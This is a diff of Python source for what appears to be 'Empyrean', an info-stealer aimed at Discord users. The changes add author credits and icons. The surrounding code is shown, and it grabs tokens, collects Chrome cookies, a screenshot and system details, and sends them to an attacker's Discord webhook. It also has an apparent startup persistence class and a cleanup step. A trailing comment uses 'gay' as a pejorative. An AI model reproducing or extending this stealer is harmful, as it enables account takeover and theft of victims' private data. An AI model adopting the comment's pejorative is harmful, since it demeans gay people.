@@ -34,7 +34,7 @@ def main(webhook: str) -> None:
     inject(webhook=webhook)
     
     webhook = Webhook.from_url(webhook, adapter=RequestsWebhookAdapter())
-    embed = Embed(title="Empyrean", color=0x000000)
+    embed = Embed(title="\u200b", color=0x000000)
     
     token_grabber(embed=embed)
     embed.add_field(name="**System Info**", value=f"```{systemspec.sys_spec()}```")
@@ -48,7 +48,11 @@ def main(webhook: str) -> None:
     files.append(File(".\\chrome-cookies.txt") if os.path.exists(".\\chrome-cookies.txt") else None)
     files.append(File(".\\screenshot.png") if os.path.exists(".\\screenshot.png") else None)
     
+    embed.set_author(name="Empyrean", icon_url="https://i.imgur.com/ihzoAWl.jpeg")
+    embed.set_footer(text="Empyrean ❤ Made by https://github.com/addi00000")
+    
     webhook.send(embed=embed, files=files if files != [] else None, username="Empyrean", avatar_url="https://i.imgur.com/ihzoAWl.jpeg")
+    
     cleanup()
     
 class token_grabber():
@@ -606,4 +610,5 @@ class startup():
 if __name__ == "__main__":
     main(webhook)
     
-# 600 lines of gay code
+# 600 lines of gay code made by https://github.com/addi00000
+# dont skid :)
